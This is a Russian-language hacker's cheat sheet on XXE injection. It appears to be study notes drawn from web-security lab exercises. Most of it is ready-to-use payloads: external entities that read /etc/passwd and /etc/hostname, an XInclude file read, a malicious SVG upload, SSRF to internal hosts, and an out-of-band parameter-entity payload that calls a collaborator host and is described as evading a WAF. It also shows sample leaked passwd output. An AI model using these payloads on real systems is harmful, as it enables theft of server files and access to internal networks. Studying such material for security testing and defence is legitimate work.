## Белый Хакер
**DTD Схема** - `<!DOCTYPE {НАЗВАНИЕ СУЩНОСТИ В ДАННОМ СЛУЧАЕ order} [ <!ELEMENT {НАЗВАНИЕ СУЩНОСТИ В ДАННОМ СЛУЧАЕ order} (#ANY)> <!Entity file SYSTEM "file:///etc/passwd"> ]><order>` **ELEMENT МОЖЕТ МЕШАТЬ И БЫТЬ ЛИШНИМ!!!**
Позже в тело запроса нужно указать &file;
## 1) Извлечение файлов
Есть код:
```xml
<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>
```
Так как приложение не выполняет никаких защит от XXE атак, то юзая такой payload:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>
```
В случае успеха в ответ получим: 
```c
Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

`При использовании реальных уязвимостей XXE в отправляемом XML-файле часто будет большое количество значений данных, любое из которых может быть использовано в ответе приложения. Чтобы систематически тестировать уязвимости XXE, вам, как правило, необходимо тестировать каждый узел данных в XML по отдельности, используя определенную вами сущность и проверяя, отображается ли она в ответе`
## 2) SSRF-атака
Если использовать Reflected-параметр, то можно получить полноценную SSRF, в ином случае, атака будет слепой.
Вот payload для полноценной SSRF использующий для эксплуатации внешний объект:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
## 3) Скрытая поверхность атаки для XXEi
### 1) XInclude
Некоторые приложения получают данные, отправленные клиентом, встраивают их на стороне сервера в XML-документ, а затем анализируют документ. Пример этого возникает, когда данные, отправленные клиентом, помещаются во внутренний запрос SOAP, который затем обрабатывается внутренней службой SOAP.В этой ситуации вы не можете выполнить классическую атаку XXE, потому что вы не контролируете весь XML-документ и поэтому не можете определить или изменить элемент `DOCTYPE`. Однако вместо этого вы могли бы использовать `XInclude`. `XInclude` является частью спецификации XML, которая позволяет создавать XML-документ из вложенных документов. Вы можете разместить атаку `XInclude` внутри любого значения данных в XML-документе, поэтому атака может быть выполнена в ситуациях, когда вы контролируете только один элемент данных, который помещен в XML-документ на стороне сервера. Чтобы выполнить атаку `XInclude`, вам необходимо сослаться на пространство имен `XInclude` и указать путь к файлу, который вы хотите включить. Например:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### 2) XXEi через загрузку файла
Если сервак принимает на загрузку XML и его производные(DOCX,SVG) или в этих файлах идёт вывод изображения, то возможно он уязвим. Вот пример уязвимого веб-сайта:
```HTTP
Content-Disposition: form-data; name="avatar"; filename="converted (1).svg"
Content-Type: image/svg+xml
```
Вот удобный веб-сайт для преобразования картинки: https://www.designinspiration.info/SVG-code-to-SVG-file-converter.html
Пример payload:
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
### С помощью изменённого Content-Type:
Если обычный POST содержит:
```HTTP
POST /action HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar
```
Тогда можно следующий запрос:
```HTTP
POST /action HTTP/1.0 Content-Type: text/xml Content-Length: 52 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
Если сайт выдал тот же результат, то можно пробовать пэйлоады.
### Blind XXEi
Чтобы доказать Blind, можно использовать метод SSRF, а сайт развернуть на Webhook.site [[Полезные Ресурсы]]
### Фильтрация &xxe; в параметрах
В таком случае можно использовать подобный payload:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
%xxe; спрятан в payload и WAF на него не реагирует